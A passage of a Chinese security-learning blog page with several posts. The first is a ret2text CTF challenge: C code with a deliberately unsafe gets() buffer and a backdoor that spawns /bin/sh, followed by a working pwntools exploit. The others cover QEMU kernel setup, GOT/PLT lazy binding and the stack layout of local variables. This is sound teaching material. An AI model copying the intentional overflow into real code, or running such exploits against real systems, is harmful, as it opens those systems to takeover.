+      <a class="p-name article-title" href="/2024/10/15/pwn-%E5%87%BA%E9%A2%98-ret2text/">pwn-出题-ret2text</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>gcc ret2text.c -no-pie -o ret2text</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">file=<span class="string">&#x27;./ret2text&#x27;</span></span><br><span class="line">p=process(file)</span><br><span class="line">elf=ELF(file)</span><br><span class="line">ret_addr=elf.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line"><span class="comment"># ret_addr=next(elf.search(asm(&#x27;ret&#x27;)))</span></span><br><span class="line"><span class="comment"># ret_addr=0x401170#手动查看</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(ret_addr)+p64(elf.sym[<span class="string">&#x27;backdoor&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/15/pwn-%E5%87%BA%E9%A2%98-ret2text/" data-id="cm3l9ut9k0008057o7t7p3nkl" data-title="pwn-出题-ret2text" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-kernel/kernel-qemu-system环境搭建" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/14/kernel/kernel-qemu-system%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="article-date">
+  <time class="dt-published" datetime="2024-10-14T14:30:49.000Z" itemprop="datePublished">2024-10-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/10/14/kernel/kernel-qemu-system%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">kernel-qemu-system环境搭建</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>等之后再完善相关操作吧</p>
+<h1 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h1><p>由于调试需要（电脑很菜,ropper加载defconfig编译的内核会无法成功 ），保持了最小的内核开启选项(串口打印输出设置，没有音频等)，配合busybox不到1s就可以启动<br>至少保持以下选项开启</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_DEVTMPFS_MOUNT 允许使用设备文件系统,使得系统启动时自动创建设备文件如/dev/null</span><br><span class="line">CONFIG_MODULE_FORCE_LOAD 强制加载驱动</span><br><span class="line">CONFIG_SMP  多线程</span><br><span class="line"></span><br><span class="line"># canary支持</span><br><span class="line">CONFIG_CC_HAS_SANE_STACKPROTECTOR=y</span><br><span class="line">CONFIG_HAVE_STACKPROTECTOR=y</span><br><span class="line">CONFIG_CC_HAS_STACKPROTECTOR_NONE=y</span><br><span class="line">CONFIG_STACKPROTECTOR=y</span><br><span class="line">CONFIG_STACKPROTECTOR_STRONG=y</span><br></pre></td></tr></table></figure>
+<h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><h2 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h2><p>没有比busybox启动更快的方法了</p>
+<h2 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h2><p>最定制的方法，busybox虽然快，但是没有基本的工具，安装工具也特别麻烦，可以使用buildroot将工具编译进去</p>
+<h2 id="debootstrap"><a href="#debootstrap" class="headerlink" title="debootstrap"></a>debootstrap</h2><p>buildroot虽然将工具编译进去了，但是再向里面添加工具就比较麻烦，使用debootstrap就可以持续地使用apt安装新的工具<br><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/tools/create-image.sh">https://github.com/google/syzkaller/blob/master/tools/create-image.sh</a></p>
+<h2 id="debian云镜像"><a href="#debian云镜像" class="headerlink" title="debian云镜像"></a>debian云镜像</h2><p>直接获得一个隔离的环境，不过这样需要自己编译并安装内核，然后将内核复制出来，否则怎么调试内核呢？<br><a target="_blank" rel="noopener" href="https://cloud.debian.org/images/cloud">https://cloud.debian.org/images/cloud</a></p>
+<h1 id="用户分享"><a href="#用户分享" class="headerlink" title="用户分享"></a>用户分享</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new:</span><br><span class="line">https://people.debian.org/~gio/dqib/</span><br><span class="line">2018(4.9;4.14,4.15):</span><br><span class="line">https://people.debian.org/~jcowgill/qemu-mips/</span><br><span class="line">old:</span><br><span class="line">https://people.debian.org/~aurel32/qemu/</span><br></pre></td></tr></table></figure>
+<h1 id="qemu-system启动配置"><a href="#qemu-system启动配置" class="headerlink" title="qemu-system启动配置"></a>qemu-system启动配置</h1><h2 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-virtfs local,path=./share,mount_tag=shared_mount,security_model=none,id=shared_folder</span><br></pre></td></tr></table></figure>
+<p>内核需要支持9p</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t 9p -o trans=virtio shared_mount /mnt/shared</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/14/kernel/kernel-qemu-system%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" data-id="cm3l9ut9x000x057obyk69nw3" data-title="kernel-qemu-system环境搭建" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-pwn-got与plt" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/14/pwn-got%E4%B8%8Eplt/" class="article-date">
+  <time class="dt-published" datetime="2024-10-14T12:59:28.000Z" itemprop="datePublished">2024-10-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/10/14/pwn-got%E4%B8%8Eplt/">pwn-got与plt</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="如何查看函数的got与plt地址"><a href="#如何查看函数的got与plt地址" class="headerlink" title="如何查看函数的got与plt地址"></a>如何查看函数的got与plt地址</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x/gx &amp;&#x27;atoi@got.plt&#x27;</span><br><span class="line">x/gx &amp;&#x27;atoi@plt&#x27;</span><br><span class="line">x/gx &amp;&#x27;atoi&#x27;</span><br></pre></td></tr></table></figure>
+<h1 id="got表与plt表有什么关系（以atoi为例）"><a href="#got表与plt表有什么关系（以atoi为例）" class="headerlink" title="got表与plt表有什么关系（以atoi为例）"></a>got表与plt表有什么关系（以atoi为例）</h1><p>我们先看看pwntools是如何处理的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf.got[&quot;atoi&quot;]: 0x404018 </span><br><span class="line">elf.plt[&quot;atoi&quot;]: 0x401060 </span><br></pre></td></tr></table></figure>
+<p>函数未调用之前，关系如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x404018 &lt;atoi@got.plt&gt;:        0x0000000000401066</span><br><span class="line">0x401060 &lt;atoi@plt&gt;:    0x036800002fb225ff</span><br><span class="line">0x7ffff7e08920 &lt;__GI_atoi&gt;:     0x00000aba08ec8348</span><br></pre></td></tr></table></figure>
+<p>可以看到<br><code>.got[&quot;atoi&quot;]</code>就是<code>&amp;&#39;atoi@got.plt&#39;</code>就是got的地址<br><code>.plt[&quot;atoi&quot;]</code>就是<code>&amp;&#39;atoi@plt&#39;</code>就是plt的地址</p>
+<p>函数在被调用时会跳转到plt (<code>call   0x401060 &lt;atoi@plt&gt;</code>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/3i 0x401060</span><br><span class="line">   0x401060 &lt;atoi@plt&gt;: jmp    *0x2fb2(%rip)        # 0x404018 &lt;atoi@got.plt&gt;</span><br><span class="line">   0x401066 &lt;atoi@plt+6&gt;:       push   $0x3</span><br><span class="line">   0x40106b &lt;atoi@plt+11&gt;:      jmp    0x401020</span><br></pre></td></tr></table></figure>
+<p>可以看到程序会先去到got表处运行，然后（在函数未被调用的情况下）又跳转回来(0x401066)继续运行，这个继续运行的东西就是延迟绑定。这个绑定会将got的值改为实际函数地址，从而不会再次运行延时绑定。<br>如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x404018 &lt;atoi@got.plt&gt;:        0x00007ffff7e08920</span><br><span class="line">0x401060 &lt;atoi@plt&gt;:    0x036800002fb225ff</span><br><span class="line">0x7ffff7e08920 &lt;__GI_atoi&gt;:     0x00000aba08ec8348</span><br></pre></td></tr></table></figure>
+
+<p>所以在函数未被调用时，泄露got的值就是plt的地址+0x6(elf.plt[“atoi”]: 0x401060)好像也没有任何意义，这和lib中的偏移没有任何关系。</p>
+<p>综上，在延迟绑定后函数调用关系如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call atoi-&gt;plt-&gt;got-&gt;atoi</span><br><span class="line">call   0x401060 &lt;atoi@plt&gt;</span><br><span class="line">0x401060 &lt;atoi@plt&gt;: jmp    *0x2fb2(%rip)        # 0x404018 &lt;atoi@got.plt&gt;</span><br><span class="line">上面一行等价于jmp 0x00007ffff7e08920</span><br></pre></td></tr></table></figure>
+
+<h1 id="如何开启或者关闭延迟绑定"><a href="#如何开启或者关闭延迟绑定" class="headerlink" title="如何开启或者关闭延迟绑定"></a>如何开启或者关闭延迟绑定</h1><p>延迟绑定默认开启<br>使用-Wl,-z,now就会关闭延迟绑定，使用非延迟绑定<br>使用-Wl,-z,lazy显式开启延迟绑定</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/14/pwn-got%E4%B8%8Eplt/" data-id="cm3l9ut9i0004057o966tbg0j" data-title="pwn-got与plt" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-pwn-局部变量" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/14/pwn-%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/" class="article-date">
+  <time class="dt-published" datetime="2024-10-14T12:32:02.000Z" itemprop="datePublished">2024-10-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/10/14/pwn-%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/">pwn-局部变量</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>局部变量就是在{}里面才生效的变量，<br>示例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test_a</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">2</span>;</span><br><span class="line">        <span class="comment">//在函数里面有效的局部变量</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;&#125;</span><br><span class="line">        <span class="comment">//循环里面的局部变量，只在循环里面有效在 ,c99支持</span></span><br><span class="line">        &#123;<span class="type">int</span> c=<span class="number">4</span>;&#125;</span><br><span class="line">        <span class="comment">//这也是局部变量，只在这个&#123;&#125;里面有效</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果我们在其作用域外打印，就会出现报错</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">test_a</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;&#125;</span><br><span class="line">        &#123;<span class="type">int</span> c=<span class="number">4</span>;&#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d\n&quot;</span>,a,i,c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t.c:<span class="number">7</span>:<span class="number">31</span>: error: ‘i’ undeclared (first use in this function)</span><br><span class="line">    <span class="number">7</span> |         <span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d\n&quot;</span>,a,i,c);</span><br><span class="line">      |                               ^</span><br><span class="line">t.c:<span class="number">7</span>:<span class="number">31</span>: note: each undeclared identifier is reported only once <span class="keyword">for</span> each function it appears in</span><br><span class="line">t.c:<span class="number">7</span>:<span class="number">33</span>: error: ‘c’ undeclared (first use in this function)</span><br><span class="line">    <span class="number">7</span> |         <span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d\n&quot;</span>,a,i,c);</span><br><span class="line">      |                                 ^</span><br></pre></td></tr></table></figure>
+
+<p>我们通过汇编看看，局部变量是如何工作的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble test_a        //可以使用set disassembly-flavor intel转换汇编格式</span><br><span class="line">Dump of assembler code for function test_a:</span><br><span class="line">   0x0000000000001129 &lt;+0&gt;:     push   %rbp //这个函数的rbp被放入栈</span><br><span class="line">   0x000000000000112a &lt;+1&gt;:     mov    %rsp,%rbp</span><br><span class="line">   0x000000000000112d &lt;+4&gt;:     movl   $0x1,-0x8(%rbp)//先定义的a</span><br><span class="line">   0x0000000000001134 &lt;+11&gt;:    movl   $0x2,-0xc(%rbp)//再定义的b，b放在a上面（高地址在下）</span><br><span class="line">   0x000000000000113b &lt;+18&gt;:    movl   $0x0,-0x4(%rbp)//for定义的i，gcc对其进行了特殊处理，在a下面（为什么呢？想想在for之前定义i会发生什么）</span><br><span class="line">   0x0000000000001142 &lt;+25&gt;:    jmp    0x1148 &lt;test_a+31&gt;</span><br><span class="line">   0x0000000000001144 &lt;+27&gt;:    addl   $0x1,-0x4(%rbp)</span><br><span class="line">   0x0000000000001148 &lt;+31&gt;:    cmpl   $0x2,-0x4(%rbp)</span><br><span class="line">   0x000000000000114c &lt;+35&gt;:    jle    0x1144 &lt;test_a+27&gt;</span><br><span class="line">   0x000000000000114e &lt;+37&gt;:    movl   $0x4,-0x10(%rbp)//最后在&#123;&#125;里面定义的c，在最上面（这样隔离最好）</span><br><span class="line">   0x0000000000001155 &lt;+44&gt;:    nop</span><br><span class="line">   0x0000000000001156 &lt;+45&gt;:    pop    %rbp</span><br><span class="line">   0x0000000000001157 &lt;+46&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>虽然a,b,c都是int类型，但根据汇编显然：<br>如果a可以被覆盖，需要0x8+0x8 （rbp+i+a）,到达返回地址<br>如果b可以被覆盖，需要0x8+0xc （rbp+i+a+b）,到达返回地址<br>如果c可以被覆盖，需要0x8+0x10（rbp+i+a+b+c）,到达返回地址<br>在pop rbp之前下断点，可以看到与上述一致的情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/4gx $rbp-0x10</span><br><span class="line">0x7fffffffdef0: 0x0000000200000004      0x0000000300000001</span><br><span class="line">0x7fffffffdf00: 0x00007fffffffdf10      0x0000555555555166</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/14/pwn-%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/" data-id="cm3l9ut9o000d057oh8qjb4re" data-title="pwn-局部变量" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-zt" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/1000/01/01/zt/" class="article-date">
+  <time class="dt-published" datetime="0999-12-31T15:55:00.000Z" itemprop="datePublished">1000-01-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/1000/01/01/zt/">zt</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/1000/01/01/zt/" data-id="cm3l9ut9u000n057o6nuka8mn" data-title="zt" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%90%81%E7%BD%AE/" rel="tag">搁置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95%E4%B8%A2%E5%A4%B1/" rel="tag">记录丢失</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/kernel/" style="font-size: 16.67px;">kernel</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/%E6%90%81%E7%BD%AE/" style="font-size: 13.33px;">搁置</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 10px;">杂项</a> <a href="/tags/%E8%AE%B0%E5%BD%95%E4%B8%A2%E5%A4%B1/" style="font-size: 10px;">记录丢失</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">十月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1000/01/">一月 1000</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/11/17/mkdocs/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/16/windows/">windows</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/23/kernel/kernel-tmp-commit-creds/">kernel-commit_creds</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/19/kernel/kernel-gdb%E8%B0%83%E8%AF%95-socket/">kernel-gdb调试-socket</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/19/ebf/">ebf</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 zt20xx<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
